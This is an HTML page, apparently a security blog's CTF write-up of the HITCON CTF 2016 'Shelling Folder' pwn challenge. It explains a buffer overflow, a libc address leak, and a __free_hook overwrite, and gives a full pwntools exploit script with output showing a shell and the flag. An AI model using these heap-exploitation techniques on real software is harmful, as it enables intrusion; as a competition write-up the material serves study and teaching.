@@ -1,0 +1,874 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="CTF,Pwnable,Python,heap,BOF,HITCON," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Hacking Tube 2.0" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="Category: pwnPoints: 200">
+<meta name="keywords" content="CTF,Pwnable,Python,heap,BOF,HITCON">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITCON CTF 2016 Quals -- Shelling Folder">
+<meta property="og:url" content="https://bruce30262.github.io/2016/10/10/2016-10-10-hitcon-ctf-2016-quals-shelling-folder/index.html">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:description" content="Category: pwnPoints: 200">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2018-01-03T15:08:05.599Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HITCON CTF 2016 Quals -- Shelling Folder">
+<meta name="twitter:description" content="Category: pwnPoints: 200">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://bruce30262.github.io/2016/10/10/2016-10-10-hitcon-ctf-2016-quals-shelling-folder/"/>
+
+
+
+
+
+  <title>HITCON CTF 2016 Quals -- Shelling Folder | Hacking Tube 2.0</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-100090256-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hacking Tube 2.0</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Security and stuff.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://bruce30262.github.io/2016/10/10/2016-10-10-hitcon-ctf-2016-quals-shelling-folder/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Bruce Chen">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://s.gravatar.com/avatar/ff4140457527a5c7d307793a9ec905e0?s=80">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hacking Tube 2.0">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HITCON CTF 2016 Quals -- Shelling Folder</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-10-10T16:11:00+08:00">
+                2016-10-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/" itemprop="url" rel="index">
+                    <span itemprop="name">write-ups</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2016/10/10/2016-10-10-hitcon-ctf-2016-quals-shelling-folder/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2016/10/10/2016-10-10-hitcon-ctf-2016-quals-shelling-folder/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-eye"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>views
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><strong>Category:</strong> pwn<br><strong>Points:</strong> 200</p>
+<a id="more"></a>  
+<p>64 bit ELF, with all the protection enabled.  </p>
+<p>The program is a simple file system. You can create or delete files and folders, list files in a folder, change the current folder and calculate the size of a folder.  </p>
+<p>It’s a unix-like file system, where folders are also a special type of file. Both folders and files are stored in the program with the following data structure:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">sub_file</span>[10];</span> <span class="comment">// will all be null if it's a normal file</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">parent_folder</span>;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">long</span> file_size;</span><br><span class="line">    <span class="keyword">int</span> is_dir;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>If a folder is created, the <code>is_dir</code> flag will be set to <code>1</code>, and the <code>file_size</code> will be set to <code>0</code>. A folder is allowed to contain at most 10 <code>sub_file</code>. If a normal file is created ( not folder ), the <code>is_dir</code> flag will be set to <code>0</code>, and the value of <code>file_size</code> is set by user. </p>
+<p>There’s a <strong>buffer overflow vulnerability</strong> in the function of calculating the folder size:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cal_folder_size</span><span class="params">(struct file *cur_folder)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s; <span class="comment">// [sp+10h] [bp-30h]@3</span></span><br><span class="line">    __int64 *v3; <span class="comment">// [sp+28h] [bp-18h]@5</span></span><br><span class="line">    <span class="keyword">int</span> idx; <span class="comment">// [sp+30h] [bp-10h]@3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !cur_folder )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( idx &lt;= <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( cur_folder-&gt;sub_file[idx] )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 = &amp;cur_folder-&gt;file_size;</span><br><span class="line">            copy_file_name(&amp;s, cur_folder-&gt;sub_file[idx]-&gt;name); <span class="comment">// &lt;-- here we have a buffer overflow vulnerability</span></span><br><span class="line">            <span class="keyword">if</span> ( cur_folder-&gt;sub_file[idx]-&gt;is_dir == <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                *v3 = *v3;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%s : size %ld\n"</span>, &amp;s, cur_folder-&gt;sub_file[idx]-&gt;file_size);</span><br><span class="line">                *v3 += cur_folder-&gt;sub_file[idx]-&gt;file_size;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ++idx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of the folder is %ld\n"</span>, cur_folder-&gt;file_size);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>When we set a file’s name, we can input at most 31 characters. Inside the <code>cal_folder_size</code> function, the program will try to copy the file’s name into a buffer <code>s</code>, which its size is only 24 bytes long. The vulnerability will cause the program to overwrite the <code>v3</code> variable.</p>
+<p>The <code>v3</code> variable is an <code>int*</code> type pointer, which points to the current folder’s <code>file_size</code>. Since we can overwrite this pointer, we can try to control this pointer and the size of the <code>sub_file[idx]</code>, so when the program execute the code at line:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*v3 += cur_folder-&gt;sub_file[idx]-&gt;file_size</span><br></pre></td></tr></table></figure></p>
+<p><strong>it will actually let us control the value of any address.</strong></p>
+<p>But remember the program has all the protection enabled, including <strong>PIE</strong>, so first we’ll have to leak some address. Here’s how I leak the address of the libc:</p>
+<ol>
+<li>Create &amp; delete some folders, so the pointer that points to the head of smallbin will appear on the heap memory.</li>
+<li>Exploit the buffer overflow vulnerability, partial overwrite the <code>v3</code> pointer and make it point to a <code>struct file</code> pointer <code>p</code> ( <code>*v3 = p</code>).  </li>
+<li>Control a <code>sub_file</code>‘s <code>file_size</code>, so when it comes to the line <code>*v3 += cur_folder-&gt;sub_file[idx]-&gt;file_size</code>, it will adjust the value of <code>p</code>, making <code>p-&gt;name</code> point to the libc’s address ( address of the smallbin’s head )</li>
+<li>List the files in the current folder and leak the libc’s address.</li>
+</ol>
+<p>After we got the libc’s address, we can use the same vulnerability to overwrite the <code>__free_hook</code> function pointer into the address of <strong>one gadget</strong>, and get the shell by deleting a file. Notice that <code>file_size</code> stores the value returned by <code>atoi</code>, a four-byte integer, so we’ll have to overwrite <code>__free_hook</code> twice : first  overwrite <code>__free_hook</code>,  then overwrite <code>__free_hook+4</code>.</p>
+<figure class="highlight python"><figcaption><span>exp_shell.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"52.69.237.212"</span></span><br><span class="line"><span class="comment">#HOST = "127.0.0.1"</span></span><br><span class="line">PORT = <span class="number">4869</span></span><br><span class="line">ELF_PATH = <span class="string">"./shellingfolder_noalarm"</span></span><br><span class="line"><span class="comment">#LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"</span></span><br><span class="line">LIBC_PATH = <span class="string">"./libc.so.6"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.endian = <span class="string">'little'</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line"><span class="comment"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span></span><br><span class="line">context.log_level = <span class="string">'INFO'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(ELF_PATH)</span><br><span class="line">libc = ELF(LIBC_PATH)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_recvuntil</span><span class="params">(s, delim)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> delim <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">        c = s.recv(<span class="number">1</span>)</span><br><span class="line">        res += c</span><br><span class="line">        sys.stdout.write(c)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myexec</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(cmd, shell=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_addr</span><span class="params">(s, f)</span>:</span> <span class="comment"># search string address in file</span></span><br><span class="line">    result = list(f.search(s+<span class="string">"\x00"</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(result): <span class="comment"># no result</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_file</span><span class="params">(name, size)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">":"</span>, <span class="string">"4"</span>)</span><br><span class="line">    r.sendafter(<span class="string">":"</span>, name)</span><br><span class="line">    r.sendlineafter(<span class="string">":"</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_dir</span><span class="params">(name)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">":"</span>, <span class="string">"2"</span>)</span><br><span class="line">    r.sendafter(<span class="string">":"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(name)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">":"</span>, <span class="string">"5"</span>)</span><br><span class="line">    r.sendafter(<span class="string">":"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_dir</span><span class="params">(name)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">":"</span>, <span class="string">"3"</span>)</span><br><span class="line">    r.sendafter(<span class="string">":"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ls</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">":"</span>, <span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cal</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">":"</span>, <span class="string">"6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = process(ELF_PATH)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite &amp;file-&gt;fize_size (address of file_size)</span></span><br><span class="line">    <span class="comment"># use cal() to let file-&gt;name point to main_arena+88</span></span><br><span class="line">    make_dir(<span class="string">"AAAA"</span>)</span><br><span class="line">    make_dir(<span class="string">"BBBB"</span>)</span><br><span class="line">    make_dir(<span class="string">"CCCC"</span>)</span><br><span class="line">    create_file(<span class="string">"F"</span>*<span class="number">24</span>+p8(<span class="number">0x10</span>), <span class="number">64</span>)</span><br><span class="line">    remove(<span class="string">"BBBB\n"</span>)</span><br><span class="line">    remove(<span class="string">"CCCC\n"</span>)</span><br><span class="line">    cal()</span><br><span class="line">    ls()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak libc address</span></span><br><span class="line">    <span class="comment">######################## one gadget</span></span><br><span class="line">    <span class="comment"># .text:000000000004525A                 mov     rax, cs:environ_ptr_0</span></span><br><span class="line">    <span class="comment"># .text:0000000000045261                 lea     rdi, aBinSh     ; "/bin/sh"</span></span><br><span class="line">    <span class="comment"># .text:0000000000045268                 lea     rsi, [rsp+188h+var_158]</span></span><br><span class="line">    <span class="comment"># .text:000000000004526D                 mov     cs:dword_3C54A0, 0</span></span><br><span class="line">    <span class="comment"># .text:0000000000045277                 mov     cs:dword_3C54A4, 0</span></span><br><span class="line">    <span class="comment"># .text:0000000000045281                 mov     rdx, [rax]</span></span><br><span class="line">    <span class="comment"># .text:0000000000045284                 call    execve</span></span><br><span class="line">    <span class="comment">##########################</span></span><br><span class="line">    r.recvuntil(<span class="string">"----------------------\n"</span>)</span><br><span class="line">    libc.address += u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0x3c3b78</span></span><br><span class="line">    one_gadget = libc.address + <span class="number">0x4525a</span></span><br><span class="line">    malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    log.success(<span class="string">"libc_base: "</span>+hex(libc.address))</span><br><span class="line">    log.success(<span class="string">"one_gadget: "</span>+hex(one_gadget))</span><br><span class="line">    log.success(<span class="string">"malloc_hook: "</span>+hex(malloc_hook))</span><br><span class="line">    log.success(<span class="string">"free_hook: "</span>+hex(free_hook))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite free_hook to one_gadet</span></span><br><span class="line">    make_dir(<span class="string">"DDDD"</span>)</span><br><span class="line">    change_dir(<span class="string">"DDDD\n"</span>)</span><br><span class="line">    create_file(<span class="string">"i"</span>*<span class="number">24</span>+p64(free_hook)[:<span class="number">7</span>:], (one_gadget &amp; <span class="number">0xffffffff</span>))</span><br><span class="line">    create_file(<span class="string">"I"</span>*<span class="number">24</span>+p64(free_hook+<span class="number">4</span>)[:<span class="number">7</span>:], ((one_gadget &amp; <span class="number">0xffffffff00000000</span>)&gt;&gt;<span class="number">32</span>))</span><br><span class="line">    cal()</span><br><span class="line">    <span class="comment"># get shell</span></span><br><span class="line">    remove(<span class="string">"i"</span>*<span class="number">24</span>+p64(free_hook)[:<span class="number">7</span>:])</span><br><span class="line">    </span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code>[x] Opening connection to 52.69.237.212 on port 4869
+[x] Opening connection to 52.69.237.212 on port 4869: Trying 52.69.237.212
+[+] Opening connection to 52.69.237.212 on port 4869: Done
+[+] libc_base: 0x7ff15c7cc000
+[+] one_gadget: 0x7ff15c81125a
+[+] malloc_hook: 0x7ff15cb8fb10
+[+] free_hook: 0x7ff15cb917a8
+[*] Switching to interactive mode
+ size 32753
+The size of the folder is 0
+**************************************
+            ShellingFolder            
+**************************************
+ 1.List the current folder            
+ 2.Change the current folder          
+ 3.Make a folder                      
+ 4.Create a file in current folder    
+ 5.Remove a folder or a file          
+ 6.Caculate the size of folder        
+ 7.Exit                               
+**************************************
+Your choice:Choose a Folder or file :
+
+// id
+uid=1000(shellingfolder) gid=1000(shellingfolder) groups=1000(shellingfolder)
+
+// cat /home/shellingfolder/flag
+hitcon{Sh3llingF0ld3r_Sh3rr1nf0rd_Pl4y_w17h_4_S1mpl3_D4t4_Ori3nt3d_Pr0gr4mm1n7}
+</code></pre><p>flag: <code>hitcon{Sh3llingF0ld3r_Sh3rr1nf0rd_Pl4y_w17h_4_S1mpl3_D4t4_Ori3nt3d_Pr0gr4mm1n7}</code></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/Pwnable/" rel="tag"># Pwnable</a>
+          
+            <a href="/tags/Python/" rel="tag"># Python</a>
+          
+            <a href="/tags/heap/" rel="tag"># heap</a>
+          
+            <a href="/tags/BOF/" rel="tag"># BOF</a>
+          
+            <a href="/tags/HITCON/" rel="tag"># HITCON</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/10/10/2016-10-10-hitcon-ctf-2016-quals-hackpad/" rel="next" title="HITCON CTF 2016 Quals -- Hackpad">
+                <i class="fa fa-chevron-left"></i> HITCON CTF 2016 Quals -- Hackpad
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/12/12/2016-12-12-seccon-ctf-2016-checker/" rel="prev" title="SECCON CTF 2016 -- checker">
+                SECCON CTF 2016 -- checker <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- Go to www.addthis.com/dashboard to customize your tools -->
+<div class="addthis_inline_share_toolbox">
+  <script type = "text/javascript" src = "//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-592d8051fa91b8b6" async = "async" ></script>
+</div>
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview sidebar-panel sidebar-panel-active">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="https://s.gravatar.com/avatar/ff4140457527a5c7d307793a9ec905e0?s=80"
+               alt="Bruce Chen" />
+          <p class="site-author-name" itemprop="name">Bruce Chen</p>
+           
+              <p class="site-description motion-element" itemprop="description">Security researcher / CTFer / Pwner</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">50</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">61</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/bruce30262" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/bruce30262" target="_blank" title="Twitter">
